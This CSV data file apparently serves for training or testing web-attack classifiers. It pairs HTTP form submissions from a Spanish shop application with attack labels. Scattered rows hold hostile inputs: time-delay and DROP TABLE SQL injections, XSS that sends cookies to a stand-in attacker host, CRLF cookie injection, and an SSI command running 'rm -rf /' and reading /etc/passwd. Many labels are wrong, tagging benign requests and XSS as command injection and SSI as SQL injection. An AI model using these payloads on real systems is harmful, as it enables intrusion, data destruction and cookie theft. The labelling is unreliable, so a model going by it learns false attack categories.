payload,category
entrar | tsong-li0 | 4oM4a1rO173To | on | Entrar HTTP/1.1,Command Injection
"Credenciales incorrectas""><!--#EXEC cmd=""dir ""-->< HTTP/1.1",SQLi
insertar' AND '1'='1 | 8804 | Pasar por caja HTTP/1.1,Command Injection
insertar | 8804 | Confirmar/ HTTP/1.1,Command Injection
"registro | augusto | adORMir | Delfor | Balsas Varillas | ku-chine@lawn.mc | 59941964P | Calle Calatrava 45,  | Canencia | 39860 | Soria | 0592645851382624 | Registrar HTTP/1.1",Command Injection
"registro | uchida | g2R0N8U54 | Nariana | Adame Garros | caba.colley@grandesinventos.mil | ','0','0','0','0');waitfor delay '0:0:15';-- | Balandrau, 142  | Sant Juli� de Vilatorta | 49325 | Teruel | 4276436600422398 | Registrar HTTP/1.1",SQLi
"registro | uchida | g2R0N8U54 | Nariana | Hop-man-s | caba.colley@grandesinventos.mil | 12952733F | Balandrau, 142  | Sant Juli� de Vilatorta | 49325 | Teruel | 4276436600422398 | Registrar HTTP/1.1",Command Injection
"registro | uchida | g2R0N8U54 | Nariana | Adame Garros | caba.colley@grandesinventos.mil | 12952733F | Balandrau, 142  | Sant Juli� de Vilatorta | 49325 | Teruel | 4276436600422398 | Registrar HTTP/1.1",Command Injection
bob@<SCRipt>alert(Paros)</scrIPT>.parosproxy.org | Queso Manchego | 39 | 3 | A�adir al carrito HTTP/1.1,XSS
1 | Queso Manchego | 85/ | 3 | A�adir al carrito HTTP/1.1,Command Injection
1 | Queso Manchego | 39 | 3 | A�adir al carrito HTTP/1.1,Command Injection
"entrar"" AND ""1""=""1 | brownlee | aluminada | off | Entrar HTTP/1.1",Command Injection
entrar | brownlee | any%3F%0ASet-cookie%3A+Tamper%3D5765205567234876235 | off | Entrar HTTP/1.1,Command Injection
entrar | brownlee | aluminada | off | Entrar HTTP/1.1,Command Injection
Credenciales incorrectas' DELETE FROM USERS HTTP/1.1,Other
insertar | 2860 | Confirmar';waitfor delay '0:0:15';-- HTTP/1.1,SQLi
paros%22%20style=%22background:url(javascript:alert('Paros')) | 2860 | Confirmar HTTP/1.1,Command Injection
insertar | 2860 | Pasar por caja/ HTTP/1.1,Command Injection
insertar | 2860 | Confirmar HTTP/1.1,Command Injection
"registro | nizar | deSem81oCadErO | Tristana | Laconich Fraga | williams_mellish@elcarritodelacompra.ki | 14559882P | Calle Arroyo Opa�el, 46  | Establ�s | 17708 | Castell�n | 3554581547535889%2B | Registrar HTTP/1.1",Command Injection
"registro | nizar | deSem81oCadErO | Tristana | Laconich Fraga | williams_mellish@elcarritodelacompra.ki | 14559882P | Calle Arroyo Opa�el, 46  | Establ�s | 17708 | Castell�n | %7C | Registrar HTTP/1.1",Command Injection
"registro | nizar | deSem81oCadErO | R'a*ms'�s | Laconich Fraga | williams_mellish@elcarritodelacompra.ki | 14559882P | Calle Arroyo Opa�el, 46  | Establ�s | 17708 | Castell�n | 3554581547535889 | Registrar HTTP/1.1",Command Injection
"registro | armenta | villero | Rondel | Avalos Da Silvaany%3F%0ASet-cookie%3A+Tamper%3D5765205567234876235 | pavlis@travelzone.vc | 84634236D | C/ Rio Bidasoa, 199  | Roca de la Sierra, La | 46910 | Valladolid | 1701163791515432 | Registrar HTTP/1.1",Command Injection
"registro | armenta | villero | Rondel | Avalos Da Silva | pavlis@travelzone.vc | 84634236D | R+++ua Clara Campoamor, 6,  | Roca de la Sierra, La | 46910 | Valladolid | 1701163791515432 | Registrar HTTP/1.1",Command Injection
"registro | armenta | villero | Rondel | Avalos Da Silva | pavlis@travelzone.vc | 84634236D | C/ Rio Bidasoa, 199  | Roca de la Sierra, La | 46910 | Valladolid | 1701163791515432 | Registrar HTTP/1.1",Command Injection
2 | Queso Manchego | 100 | 29 | A�adir al carrito%2B HTTP/1.1,Command Injection
"','0','0','0','0');waitfor delay '0:0:15';-- | Queso Manchego | 100 | 29 | A�adir al carrito HTTP/1.1",SQLi
2 | Queso Manchego | 39/ | 29 | A�adir al carrito HTTP/1.1,Command Injection
2 | Queso Manchego | 100 | 29 | A�adir al carrito HTTP/1.1,Command Injection
entrar | semmens | 5872ra | any%3F%0D%0ASet-cookie%3A+Tamper%3D1041264011025374727 | Entrar HTTP/1.1,Command Injection
entrar | d/msrtime | 5872ra | off | Entrar HTTP/1.1,Command Injection
entrar | semmens | 5872ra | off | Entrar HTTP/1.1,Command Injection
insertar | ');waitfor delay '0:0:15';-- | Pasar por caja HTTP/1.1,SQLi
insertar | 5627 | Confirmar/ HTTP/1.1,Command Injection
insertar | 5627 | Pasar por caja HTTP/1.1,Command Injection
"registro | leupold | f8i73a | Rogaciano | Huasupoma Llobera | florath_cochran@hiperzaragoza.aq | 42620172E | C/ Sagrados Corazones 27, 7?A | Villalbilla de Gumiel | 1137A | Zamora | 1281104729948051 | Registrar HTTP/1.1",Command Injection
"registro | leupold | f8i73a | Rogaciano | Huasupoma Llobera | florath_cochran@hiperzaragoza.aq | 42620172E | C/ Sagrados Corazones 27, 7?A | Villalbilla de Gumiel | 10230 | Zamora | 1281104729948051 | Registrar HTTP/1.1",Command Injection
"registro | muise | l321n2c3r','0','0','0');waitfor delay '0:0:15';-- | Matco | Yera Patriz | bacall@djbroadcast.hk | 75976186X | Calle Garcia Arista 97, 6?B | Betancuria | 34191 | Cuenca | 9917801099618736 | Registrar HTTP/1.1",SQLi
"registro | muise | l321n2c3r | Matco | Yera Patriz | cervenka_murna7@po@@rtaldesign.hn | 75976186X | Calle Garcia Arista 97, 6?B | Betancuria | 34191 | Cuenca | 9917801099618736 | Registrar HTTP/1.1",Command Injection
1 | Queso Manchego'OR'a='a | 39 | 53 | A�adir al carrito HTTP/1.1,Command Injection
1 | Queso Manchego | 100/ | 53 | A�adir al carrito HTTP/1.1,Command Injection
1 | Queso Manchego | 39 | 53 | A�adir al carrito HTTP/1.1,Command Injection
entrar | ba**hl | ATRabIliARio | off | Entrar HTTP/1.1,Command Injection
entrar | azzuolo | ATRabIliARio | off | Entrar HTTP/1.1,Command Injection
Credenciales incorrectasSet-cookie%3A+Tamper%3D1041264011025374727 HTTP/1.1,Encoded Attack
%20 HTTP/1.1,Encoded Attack
insertarany%3F%0D%0ASet-cookie%3A+Tamper%3D1041264011025374727 | 2949 | Pasar por caja HTTP/1.1,Command Injection
insertar | 2949 | Confirmar/ HTTP/1.1,Command Injection
insertar | 2949 | Pasar por caja HTTP/1.1,Command Injection
registro | wei | yaguan� | Estefan | Tomasa Camino | paros%22%20style=%22background:url(javascript:alert('Paros')) | 75996092K | Guadiana S/N 2?C | Ossa de Montiel | 08470 | Badajoz | 4288323841686638 | Registrar HTTP/1.1,Command Injection
"registro | wei | presEn,/,cIaR | Estefan | Tomasa Camino | bovell_haygarth@nuestrasantacruz.vu | 75996092K | Guadiana S/N 2?C | Ossa de Montiel | 08470 | Badajoz | 4288323841686638 | Registrar HTTP/1.1",Command Injection
registro | wei | yaguan� | Estefan | Tomasa Camino | bovell_haygarth@nuestrasantacruz.vu | 75996092K | Guadiana S/N 2?C | Ossa de Montiel | 08470 | Badajoz | 4288323841686638 | Registrar HTTP/1.1,Command Injection
registro | mya | rencor | Roxana | Murillo Pastrana | constantaras@fighting-machines.ukAND 1=1 | 05736398Z | Calle Victoria Kents 46  | San Miguel de Serrezuela | 18330 | Girona | 2610269003230246 | Registrar HTTP/1.1,Command Injection
registro | sessionid=12312312& username=%3C%73%63%72%69%70%74%3E%64%6F%63%75%6D%65%6E%74%2E%6C%6F%63%61%74%69%6F%6E%3D%27%68%74%74%70%3A%2F%2F%61%74%74%61%63%6B%65%72%68%6F%73%74%2E%65%78%61%6D%70%6C%65%2F%63%67%69%2D%62%69%6E%2F%63%6F%6F%6B%69%65%73%74%65%61%6C%2E%63%67%69%3F%27%2B%64%6F%63%75%6D%65%6E%74%2E%63%6F%6F%6B%69%65%3C%2F%73 %63%72%69%70%74%3E? | rencor | Roxana | Murillo Pastrana | constantaras@fighting-machines.uk | 05736398Z | Calle Victoria Kents 46  | San Miguel de Serrezuela | 18330 | Girona | 2610269003230246 | Registrar HTTP/1.1,Command Injection
registro | mya | rencor | Roxana | Murillo Pastrana | constantaras@fighting-machines.uk | 05736398Z | Calle Victoria Kents 46  | San Miguel de Serrezuela | 18330 | Girona | 741988314886623 | Registrar HTTP/1.1,Command Injection
2 | Vino Rioja | 100sessionid=12312312& username=<script>document.location='http://hacker .example.com/cgi-bin/cookiesteal.cgi?'+ document.cookie</script> | 97 | A�adir al carrito HTTP/1.1,XSS
2 | '; DROP TABLE usuarios; SELECT * FROM datos WHERE nombre LIKE '% | 100 | 97 | A�adir al carrito HTTP/1.1,SQLi
2 | Vino Rioja | 39/ | 97 | A�adir al carrito HTTP/1.1,Command Injection
2 | Vino Rioja | 100 | 97 | A�adir al carrito HTTP/1.1,Command Injection
entrar | han-van | p41en4t63o | on | bob@<SCRipt>alert(Paros)</scrIPT>.parosproxy.org HTTP/1.1,XSS
"entrar | ,m?ori+moto | p41en4t63o | on | Entrar HTTP/1.1",Command Injection
entrar | han-van | p41en4t63o | on | Entrar HTTP/1.1,Command Injection
"2','0');waitfor delay '0:0:15';-- HTTP/1.1",SQLi
Credenciales incorrectasany%3F%0ASet-cookie%3A+Tamper%3D5765205567234876235 HTTP/1.1,Encoded Attack
'INJECTED_PARAM | 7731 | Pasar por caja HTTP/1.1,Command Injection
insertar | 7731 | Confirmar/ HTTP/1.1,Command Injection
insertar | 7731 | Pasar por caja HTTP/1.1,Command Injection
registro | gallard | c36ba | Federica | Corb� Pichunman | pankin@muevetuweb.mobi | 49680817N%00 | Calle Zapateria Vieja 71 8D | Romanillos de Atienza | 03579 | Tarragona | 2469234767327968 | Registrar HTTP/1.1,Command Injection
"registro | gallard | c36ba | Federica | Romaguera Po,c*h | pankin@muevetuweb.mobi | 49680817N | Calle Zapateria Vieja 71 8D | Romanillos de Atienza | 03579 | Tarragona | 2469234767327968 | Registrar HTTP/1.1",Command Injection
registro | gallard | c36ba | Federica | Corb� Pichunman | pankin@muevetuweb.mobi | 49680817N | Calle Zapateria Vieja 71 8D | Romanillos de Atienza | 03579 | Tarragona | 2469234767327968 | Registrar HTTP/1.1,Command Injection
Vaciar carritobob@<SCRipt>alert(Paros)</scrIPT>.parosproxy.org HTTP/1.1,XSS
"registro | burdette | alm3donad6 | Luciliano | Maroto Fancelli | voldstad3@enlapalma.com.gy | 89061921X | C/ Rams, 70 11-F | Hornillos de Cameros | 19119 | any%3F%0ASet-cookie%3A+Tamper%3D5765205567234876235 | 2545576057068640 | Registrar HTTP/1.1",Command Injection
"registro | burdette | alm3donad6 | Luciliano | Maroto Fancelli | voldstad3@enlapalma.com.gy | 89061921X | C/ Rams, 70 11-F | Sa?ntib��*e*z de Esgueva | 19119 | Burgos | 2545576057068640 | Registrar HTTP/1.1",Command Injection
"registro | burdette | alm3donad6 | Luciliano | Maroto Fancelli | voldstad3@enlapalma.com.gy | 89061921X | C/ Rams, 70 11-F | Hornillos de Cameros | 19119 | Burgos | 2545576057068640 | Registrar HTTP/1.1",Command Injection
3 | Vino Rioja | 39/ | 83 | A�adir al carrito HTTP/1.1,Command Injection
3 | Vino Rioja | 100 | 83 | A�adir al carrito HTTP/1.1,Command Injection
"entrar | coloads"" AND ""1""=""1 | riosellano | off | Entrar HTTP/1.1",Command Injection
coloads | riosellano | off | Entrar HTTP/1.1,Command Injection
entrar | coloads | riosellano | on/ | Entrar HTTP/1.1,Command Injection
entrar | coloads | riosellano | off | Entrar HTTP/1.1,Command Injection
1';waitfor delay '0:0:15';-- HTTP/1.1,SQLi
insertar | 8619 | Confirmar/ HTTP/1.1,Command Injection
insertar | 8619 | Confirmar HTTP/1.1,Command Injection
"registro | price | enlucimiento | Roldan | Kisines Selvas | sverdlin@cortinasartesol.gl | 57845890Q | Muelle Ca�onero Dato, S/N 6-G | Luisiana, La'; DROP TABLE usuarios; SELECT * FROM datos WHERE nombre LIKE '% | 10811 | Palencia | 1813562312950494 | Registrar HTTP/1.1",SQLi
"registro | price | enlucimiento | Roldan | Kisines Selvas | sverdlin@cortinasartesol.gl | 57845890Q | Muelle Ca�onero Dato, S/N 6-G | Luisiana, La | paros%22+style%3D%22background%3Aurl%28javascript%3Aalert%28%27Paros%27%29%29&id=2 | Palencia | 1813562312950494 | Registrar HTTP/1.1",Command Injection
"registro | price | enlucimiento | Roldan | Kisines Selvas | sverdlin@cortinasartesol.gl | 57845890Q | Muelle Ca�onero Dato, S/N 6-G | Luisiana, La | 10811 | Na.varra | 1813562312950494 | Registrar HTTP/1.1",Command Injection
"registro | price | enlucimiento | Roldan | Kisines Selvas | sverdlin@cortinasartesol.gl | 57845890Q | Muelle Ca�onero Dato, S/N 6-G | Luisiana, La | 10811 | Palencia | 1813562312950494 | Registrar HTTP/1.1",Command Injection
Vaciar carritoany%0D%0ASet-cookie%3A+Tamper%3D5765205567234876235 HTTP/1.1,Encoded Attack
"registro | ','0','0','0');waitfor delay '0:0:15';-- | c6r5FOL4o | Gilbr�n | Villalobos Busoms | gounaris-ressel@bru�oseguridad.je | 94798155K | Carretera Platja Llarga 120, 1?C | Casas de Ves | 33820 | Cantabria | 4169442426229834 | Registrar HTTP/1.1",SQLi
"registro | merrili | c6r5FOL4o | Gilbr�n | Villalobos Busoms | gounaris-ressel@bru�oseguridad.je | 94798155K | Carretera Platja Llarga 120, 1?C | Casas de Ves | 33820 | Cantabria | 4169442426229834 | Registrar HTTP/1.1",Command Injection
2 | Ques+o Manchego | 39 | 69 | A�adir al carrito HTTP/1.1,Command Injection
2 | Vino Rioja | 39 | 69 | A�adir al carrito HTTP/1.1,Command Injection
"entrar | yansun | 03s6ig89<!--#exec cmd=""rm -rf /;cat /etc/passwd"" --> | on | Entrar HTTP/1.1",SQLi
"entrar | yansun | ','0');waitfor delay '0:0:15';-- | on | Entrar HTTP/1.1",SQLi
"entrar | yansun | 'emBOb,a-'Miento | on | Entrar HTTP/1.1",Command Injection
"insertar | 9805 | Pasar por caja<SCRIPT>alert(""Paros"");</SCRIPT> HTTP/1.1",XSS
"','0');waitfor delay '0:0:15';-- | 9805 | Pasar por caja HTTP/1.1",SQLi
insertar | 9805 | Confirmar/ HTTP/1.1,Command Injection
insertar | 9805 | Pasar por caja HTTP/1.1,Command Injection
"registro | zumel | resalado | Wenceslada | Bocachica Barris | zigon@@@callalelaboca.so | 16612973G | C/ Tomas Perez, 130,  | Santa Maria de Palautordera | 44593 | Almer�a | 0177727308536638 | Registrar HTTP/1.1",Command Injection
"registro | zumel | resalado | Wenceslada | Bocachica Barris | thebs-camoiras@evelin.mq | 16612973G | C/ Tomas Perez, 130,  | Santa Maria de Palautordera | 44593 | Almer�a | 0177727308536638 | Registrar HTTP/1.1",Command Injection
"registro | dirienzo | HacEdOr | Geraldo | Turra Clop�s | fang_lavanant@infotek.gu | 39243664Y | Calle Tres Marias, 103  | Uterga+ | 28980 | Zaragoza | 7982155754096924 | Registrar HTTP/1.1",Command Injection
"registro | dirienzo | HacEdOr | Geraldo | Turra Clop�s | fang_lavanant@infotek.gu | 39243664Y | Calle Tres Marias, 103  | <!--#include file=""archivo_secreto"" --> | 28980 | Zaragoza | 7982155754096924 | Registrar HTTP/1.1",SQLi
"registro | dirienzo | HacEdOr | Geraldo | Turra Clop�s | fang_lavanant@infotek.gu | 39243664Y | Calle Tres Marias, 103  | Uterga | 28980 | Zaragoza | 7982155754096924 | Registrar HTTP/1.1",Command Injection
2 | Queso Manchego | 85 | 58AND 1=1 | A�adir al carrito HTTP/1.1,Command Injection
"2 | Queso Manchego | 85 | ','0','0');waitfor delay '0:0:15';-- | A�adir al carrito HTTP/1.1",SQLi
"entrar | wolfie8 | antagallar | off | Entrar<!--#EXEC cmd=""ls /""--> HTTP/1.1",SQLi
entrar | + | antagallar | off | Entrar HTTP/1.1,Command Injection
"entrar | wolfie8 | on/9,g'784iea | off | Entrar HTTP/1.1",Command Injection
entrar | wolfie8 | antagallar | off | Entrar HTTP/1.1,Command Injection
"1','0','0');waitfor delay '0:0:15';-- HTTP/1.1",SQLi
insertar | 588 | Pasar por cajaparos%22+style%3D%22background%3Aurl%28javascript%3Aalert%28%27Paros%27%29%29&id=2 HTTP/1.1,Command Injection
insertar | 588 | Confirmar/ HTTP/1.1,Command Injection
insertar | 588 | Pasar por caja HTTP/1.1,Command Injection
"registro | poh-soon | 4hicue84 | Asad | Serralta Calzina | urecel@elbauldelosrefranes.ky | 30292866A | Carrer Bonsucces 144  | Sotillo, El | 19442 | H.uesca | 5175468282615613 | Registrar HTTP/1.1",Command Injection
"registro | poh-soon | 4hicue84 | Asad | Serralta Calzina | urecel@elbauldelosrefranes.ky | 30292866A | Carrer Bonsucces 144  | Sotillo, El | 19442 | Soria | 5175468282615613 | Registrar HTTP/1.1",Command Injection
"registro | carolina | paros%22+style%3D%22background%3Aurl%28javascript%3Aalert%28%27Paros%27%29%29&id=2 | Ihor | M�gica Vall�s | urecal8@espanolynegocios.bu | 67961648Y | Av. Olimpica, 156  | Navajas | 43941 | Madrid | 2515177122592288 | Registrar HTTP/1.1",Command Injection
"registro | carolina | paRtICUlaridaD | Ihor | M�gica Vall�s | urecal8@espanolynegocios.bu | 67961648Y | Av. Olimpica, 156  | Navajas | 43941 | Madrid | 174250683685812 | Registrar HTTP/1.1",Command Injection
"registro | carolina | paRtICUlaridaD | Ihor | M�gica Vall�s | urecal8@espanolynegocios.bu | 67961648Y | Av. Olimpica, 156  | Navajas | 43941 | Madrid | 2515177122592288 | Registrar HTTP/1.1",Command Injection
2 | '; DROP TABLE usuarios; SELECT * FROM datos WHERE nombre LIKE '% | 85 | 18 | A�adir al carrito HTTP/1.1,SQLi
2 | Queso Manchego | 85/ | 18 | A�adir al carrito HTTP/1.1,Command Injection
2 | Queso Manchego | 85 | 18 | A�adir al carrito HTTP/1.1,Command Injection
entrar | freeburn | florar | off%00 | Entrar HTTP/1.1,Command Injection
entrar | freeburn | florar | off | Entrar HTTP/1.1,Command Injection
');waitfor delay '0:0:15';-- | 4564 | Confirmar HTTP/1.1,SQLi
insertar | 4564 | Confirmar/ HTTP/1.1,Command Injection
insertar | 4564 | Confirmar HTTP/1.1,Command Injection
"registro | jowett | 2�082Es | Malco | Fresquet Giuggia | moriaty.suchima@vendomiatico.at | 34012270P | C/ Codigo Apartados Particulares Oficiales y Lista 94, 3?E | Vall de*. Card�s | 09613 | Salamanca | 1543672181801522 | Registrar HTTP/1.1",Command Injection
"registro | jowett | 2�082Es | Malco | Fresquet Giuggia | moriaty.suchima@vendomiatico.at | 34012270P | C/ Codigo Apartados Particulares Oficiales y Lista 94, 3?E | Benaoj�n | 09613 | Salamanca | 1543672181801522 | Registrar HTTP/1.1",Command Injection
"registro | pattin | 48h817n7 | Tr�nsito | Camorlinga Aragon�s | boehm@zeat.bo  | 67474361C | Alvar Garcia, S/N,  | Gav� | 06413 | Toledo | 2637703097461568 | Registrar HTTP/1.1",Command Injection
registro | pattin | 48h817n7 | Tr�nsito | Camorlinga Aragon�s | boehm@zeat.bo | 67474361C | Praza* Crucero De Cani*do* 144 9?G | Gav� | 06413 | Toledo | 2637703097461568 | Registrar HTTP/1.1,Command Injection
"registro | pattin | 48h817n7 | Tr�nsito | Camorlinga Aragon�s | boehm@zeat.bo | 67474361C | Alvar Garcia, S/N,  | Gav� | 06413 | Toledo | 2637703097461568 | Registrar HTTP/1.1",Command Injection
3 | Queso Manchego | 85 | 17 | A�adir al carrito%7C HTTP/1.1,Command Injection
"','0','0','0');waitfor delay '0:0:15';-- | Queso Manchego | 85 | 17 | A�adir al carrito HTTP/1.1",SQLi
3 | Queso Manchego | 85 | 17 | A�adir al carrito HTTP/1.1,Command Injection
"entrar | +mombour,?q | granoto | on | Entrar HTTP/1.1",Command Injection
entrar | lawther | granoto | on | Entrar HTTP/1.1,Command Injection
insertar | 8421 | Pasar por caja/ HTTP/1.1,Command Injection
insertar | 8421 | Confirmar HTTP/1.1,Command Injection
registro | +vonnie | lLaNiSca | Onella | Wiedeman Nal�n | sirichanya@vinavilano.pe | 97036086Y | Calle Yela Utrilla 150  | Villanueva del Trabuco | 37450 | M�laga | 3862460916827849 | Registrar HTTP/1.1,Command Injection
registro | ault | lLaNiSca | Onella | Wiedeman Nal�n | sirichanya@vinavilano.pe | 97036086Y | Calle Yela Utrilla 150  | Villanueva del Trabuco | 37450 | M�laga | 3862460916827849 | Registrar HTTP/1.1,Command Injection
registro | malina6 | ami3os | Sharim | Novell Abenoza%20 | tanimoto_hassen@autobuses-hibridos.tw | 62773463T | Matarrosa 103  | Campos | 16760 | Girona | 6063512360639873 | Registrar HTTP/1.1,Command Injection
registro | malina6 | ami3os | Sharim | Novell Abenoza | tanimoto_hassen@autobuses-hibridos.tw | 62773463T | Matarrosa 103  | Campos | 16760 | Girona | 076139709096347 | Registrar HTTP/1.1,Command Injection
registro | malina6 | ami3os | Sharim | Novell Abenoza | tanimoto_hassen@autobuses-hibridos.tw | 62773463T | Matarrosa 103  | Campos | 16760 | Girona | 6063512360639873 | Registrar HTTP/1.1,Command Injection
"1 | Vino Rioja | 85 | 76""><!--#EXEC cmd=""dir ""-->< | A�adir al carrito HTTP/1.1",SQLi
